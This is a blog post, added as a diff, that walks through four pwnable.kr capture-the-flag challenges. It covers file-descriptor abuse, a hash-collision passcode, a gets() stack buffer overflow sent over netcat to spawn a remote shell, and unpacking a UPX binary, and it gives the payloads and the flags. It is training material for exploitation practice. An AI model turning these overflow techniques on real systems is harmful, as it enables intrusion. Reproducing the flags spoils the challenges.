@@ -1,0 +1,299 @@
+---
+layout: post
+title:  "pwnable.kr"
+subtitle: "Testing grounds"
+date: 2019-03-04
+---
+
+##### Please note: _due to the popularity of this CTF, the following writeup won't include too much details about the material that's readily available on the challenge's server._
+
+---
+
+# 1. fd
+
+Once logged in, there will be three files in the user's home:
+
++ `fd`, a binary
++ `fd.c`, the source of that binary
++ `flag` - _nope, you can't just `cat flag` :)_
+
+The source of `fd` tells us that it will open a file descriptor with number `argv[1] - 0x1234` and, if it contains `LETMEWIN\n`, it'll show us the flag.
+
+In Unix systems FDs are incremental, and the first three are defined as follows:
+
+| Index | Stream |
+| --- | --- |
+| 0 | STDIN |
+| 1 | STDOUT |
+| 2 | STDERR |
+
+Since `fd.c` shows that it'll be reading from an already open FD of its own process, a simple solution would be to pipe something into it: using the already available STDIN FD can be a good choice, but there's a catch: `fd` processes the FD number to read as `atoi(argv[1]) - 0x1234`, so we need to account for that offset when specifying its 1st parameter.
+
+_0x1234_ must be converted to decimal (it'll be run through `atoi`, so no hex allowed), and that gives us the complete command...
+
+```bash
+echo "LETMEWIN" | ~/fd 4660
+```
+{: .spoiler}
+
+...and the flag: _mommy! I think I know what a file descriptor is!!_{: .spoiler}
+
+---
+
+# 2. col
+
+This challenge has a similar structure: a binary, its source and the flag file are given.
+
+This time `col.c` shows that the flag will be printed if the sum of the passcode given as an input equals to `0x21DD09EC` (568134124<sub>dec</sub>). It isn't a standard ASCII sum, though: the `argv[1]` char _(1 byte)_ array gets casted to an int _(4 bytes)_ array and a moving sum of the 5 first values will be done - hence the 20 bytes length specified in the inbuilt help.
+
+Our passcode will need to be made of 5 **integer** blocks that sum up as the target value, so we can round up the target to the nearest multiple of 5 and the add back the remainder to the last block:
+
++ target = 568134124
++ remainder = 568134124 % 5 = 4
++ val1 = (target - remainder) / 5
++ val2 = val1 + remainder
++ passcode = (val1 * 4) + val2 = **(113626824 * 4) + 113626828**
+
+This will need to be converted to a byte array to ensure the correct length: 113626824<sub>dec</sub>⇀0x06C5CEC8<sub>hex</sub> & 113626828<sub>dec</sub>⇀0x06C5CECC<sub>hex</sub>; `lscpu | grep -i order` tells us that this system is little-endian, so our final payload will become...
+
+```bash
+~/col "$(printf '\xc8\xce\xc5\x06%.0s' {1..4})$(echo -e '\xcc\xce\xc5\x06')"
+```
+{: .spoiler}
+
+...and the flag is: _daddy! I just managed to create a hash collision :)_{: .spoiler}
+
+---
+
+# 3. bof
+
+This time we're directly provided with the downloadable source (and binary) of the program that's running @ `pwnable.kr:9000`; as its name implies we'll have to use a buffer overflow to get the flag, so GDB will step into the game: `gcc bof.c -m32 -g -o bof && gdb bof`.
+
+_Note 1: compiling for 32bit simplifies memory address space and the debug symbols flag could be considered cheating, but we're provided the full source after all so why complicate the task further?_
+
+_Note 2: I had wrongly compiled a [PIE executable](https://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables) and the memory mapping changed when the program was run, so I had to use GDB's [`starti`](https://sourceware.org/gdb/onlinedocs/gdb/Starting.html) command to run it and stop at the first instruction. You can either use the `-no-pie` flag when compiling the binary or avoid passing `--enable-default-pie` when building GCC from source._
+
+We're interested in the `func` function since it contains the comparison that we need to force true to get the flag: `(gdb) list func`.
+
+```c
+void func(int key){
+        char overflowme[32];
+        printf("overflow me : ");
+        gets(overflowme);       // smash me!
+        if(key == 0xcafebabe){
+                system("/bin/sh");
+        }
+        else{
+                printf("Nah..\n");
+        }
+}
+```
+
+We want to target the `key == 0xcafebabe` comparison, in which `key` was previously defined in the code as `0xdeadbeef`; since it is referenced after `gets()` fills the `overflowme` buffer without a proper length check, we can use that to mangle memory and force the right side of the comparison to be equal to `key`.
+
+With `(gdb) disas func` we can find the address of that comparison:
+
+```
+Dump of assembler code for function func:
+   0x565561cd <+0>:	push   %ebp
+   0x565561ce <+1>:	mov    %esp,%ebp
+   0x565561d0 <+3>:	push   %ebx
+   0x565561d1 <+4>:	sub    $0x34,%esp
+   0x565561d4 <+7>:	call   0x565560d0 <__x86.get_pc_thunk.bx>
+   0x565561d9 <+12>:	add    $0x2e27,%ebx
+   0x565561df <+18>:	mov    %gs:0x14,%eax
+   0x565561e5 <+24>:	mov    %eax,-0xc(%ebp)
+   0x565561e8 <+27>:	xor    %eax,%eax
+   0x565561ea <+29>:	sub    $0xc,%esp
+   0x565561ed <+32>:	lea    -0x1ff8(%ebx),%eax
+   0x565561f3 <+38>:	push   %eax
+   0x565561f4 <+39>:	call   0x56556030 <printf@plt>
+   0x565561f9 <+44>:	add    $0x10,%esp
+   0x565561fc <+47>:	sub    $0xc,%esp
+   0x565561ff <+50>:	lea    -0x2c(%ebp),%eax
+   0x56556202 <+53>:	push   %eax
+   0x56556203 <+54>:	call   0x56556040 <gets@plt>
+   0x56556208 <+59>:	add    $0x10,%esp
+   0x5655620b <+62>:	cmpl   $0xcafebabe,0x8(%ebp)    // <== Here's the key
+```
+
+Once we've found the address of the comparison, let's inspect further:
+
++ Set the breakpoint: `(gdb) break *0x0x5655620b`
++ Continue execution: `(gdb) c`
++ Feed some recognizable chars to the buffer (`!` is, for example, 0x41 in ASCII)
++ Check that we're inspecting the right buffer: `p overflowme`
++ Inspect the memory as hex words: `x/16x overflowme`
+
+I've fed a bunch of `!`s as input, so my memory will contain easily spottable `0x21`s - let's view 16 hex words from the `overflowme` variable on:
+
+```
+(gdb) x/16x overflowme
+0xffffce9c:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffceac:	0x21212121	0x21212121	0xf7f8ee00	0x00000000
+0xffffcebc:	0x7029cb00	0xf7f8f3bc	0x00000000	0xffffcee8
+0xffffcecc:	0x56556279	0xdeadbeef	0xffffcf94	0xffffcf9c
+```
+
+Here they are! Notice anything else? The `0xdeadbeef` key used for the comparison is located 13 words _(13 * 4 bytes)_ after the start of the `overflowme` buffer, let's see if we can overwrite it. _Note: Python helps us with quick strings manipulations, but v3 doesn't handle hex strings as v2 did so I've used `echo -e` as a quick & dirty workaround._
+
++ In another shell use `python -c 'print("!"*4*13)'` to generate the input.
++ Rerun the program: `(gdb) r`
++ Paste the generated input and wait for the breakpoint to kick in.
++ Inspect memory: `(gdb) x/16x overflowme`
+
+```
+(gdb) x/16x overflowme
+0xffffce9c:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffceac:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffcebc:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffcecc:	0x21212121	0xdeadbe00	0xffffcf94	0xffffcf9c
+```
+
+As expected, the null terminator of the string overflowed and was written over the last byte of the key _(little endian system)_. Knowing this, we can craft a payload that will write the correct values onto that bytes and as such make the left side of the comparison equal to the expected right one.
+
+
++ `(gdb) run <<< $(echo -e $(python -c "print('!'*4*13)")\\xbe\\xba\\xfe\\xca)`
++ `(gdb) x/16x overflowme`
+
+```
+(gdb) x/16x overflowme
+0xffffce9c:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffceac:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffcebc:	0x21212121	0x21212121	0x21212121	0x21212121
+0xffffcecc:	0x21212121	0xcafebabe	0xffffcf00	0xffffcf9c
+```
+
+Et voilà! The comparison will now succeed. Let's quit GDB and run the same payload over netcat - running it locally would give us a shell on our system since the program will spawn `/bin/sh`.
+
++ `echo -e $(python -c "print('!'*4*13)")\\xbe\\xba\\xfe\\xca | nc pwnable.kr 9000`{: .spoiler}
+
+It seems that this does nothing, shell commands won't give any output... That's because the spawned process terminates immediately since STDIN does not get tied to it. A simple - yet obscure - workaround is using `cat` to keep the pipe open:
+
++ `(echo -e $(python -c "print('!'*4*13)")\\xbe\\xba\\xfe\\xca; cat -) | nc pwnable.kr 9000`{: .spoiler}
+
+It won't look like it but you are now effectively interacting with a shell:
+
+```sh
+pwd         # Check the working directory
+ls -l       # Look for the flag
+cat flag    # Grab it!
+```
+
+The flag is: _daddy, I just pwned a buFFer :)_{: .spoiler}
+
+---
+
+# 4. flag
+
+We're only given a seemingly ordinary binary to play with:
+
+```bash
+> file ./flag
+flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
+
+> chmod +x flag && ./flag
+I will malloc() and strcpy the flag there. take it.
+```
+
+It looks like we'll have to look for a `malloc` call in the code. GDB doesn't show anything useful:
+
+```no-highlight
+> gdb ./flag
+...
+gdb$ info functions
+All defined functions:
+gdb$
+```
+
+Symbols must have been stripped, let's see what a raw `strings` analysis can yield:
+
+```no-highlight
+> strings ./flag
+...
+$Info: This file is packed with the UPX executable packer http://upx.sf.net $
+$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
+...
+```
+
+In the sea of characters written to screen, a clear hint is found: this binary has been compressed with UPX! Running `upx -l ./flag` indeed confirms it:
+
+```no-highlight
+> upx -l ./flag
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2018
+UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+    883745 ->    335288   37.94%   linux/amd64   ./flag
+```
+
+Unpacking is easy: `upx -d ./flag` - _Note: your file will be overwritten!_
+
+```bash
+> file ./flag
+flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
+```
+
+Now GDB has something to work on:
+
+```no-highlight
+> gdb ./flag
+...
+gdb$ info functions main
+All functions matching regular expression "main":
+
+Non-debugging symbols:
+0x0000000000401164  main
+0x00000000004011b0  __libc_start_main
+0x0000000000402d80  _IO_switch_to_main_get_area
+...
+gdb$ disas main
+Dump of assembler code for function main:
+   0x0000000000401164 <+0>:	push   %rbp
+   0x0000000000401165 <+1>:	mov    %rsp,%rbp
+   0x0000000000401168 <+4>:	sub    $0x10,%rsp
+   0x000000000040116c <+8>:	mov    $0x496658,%edi
+   0x0000000000401171 <+13>:	callq  0x402080 <puts>
+   0x0000000000401176 <+18>:	mov    $0x64,%edi
+   0x000000000040117b <+23>:	callq  0x4099d0 <malloc>
+   0x0000000000401180 <+28>:	mov    %rax,-0x8(%rbp)
+   0x0000000000401184 <+32>:	mov    0x2c0ee5(%rip),%rdx        # 0x6c2070 <flag>
+   0x000000000040118b <+39>:	mov    -0x8(%rbp),%rax
+   0x000000000040118f <+43>:	mov    %rdx,%rsi
+   0x0000000000401192 <+46>:	mov    %rax,%rdi
+   0x0000000000401195 <+49>:	callq  0x400320
+   0x000000000040119a <+54>:	mov    $0x0,%eax
+   0x000000000040119f <+59>:	leaveq
+   0x00000000004011a0 <+60>:	retq
+End of assembler dump.
+```
+
+How nice of GDB, it even located the flag's buffer for us. Let's leverage that:
+
+```no-highlight
+gdb$ b *0x401184
+Breakpoint 1 at 0x401184
+gdb$ c
+Continuing.
+I will malloc() and strcpy the flag there. take it.
+
+Breakpoint 1, 0x0000000000401184 in main ()
+gdb$ p flag
+'flag' has unknown type; cast it to its declared type
+```
+
+A bit of poking around and we get the contents of the buffer right away:
+
+```no-highlight
+gdb$ p (int) flag
+$1 = 0x496628
+gdb$ p (char) flag
+$2 = 0x28
+gdb$ p (char*) flag
+$3 = 0x496628 "UPX...? sounds like a delivery service :)"
+```
+{: .spoiler}
+
+Key extracted ✓ _UPX...? sounds like a delivery service :)_{: .spoiler}
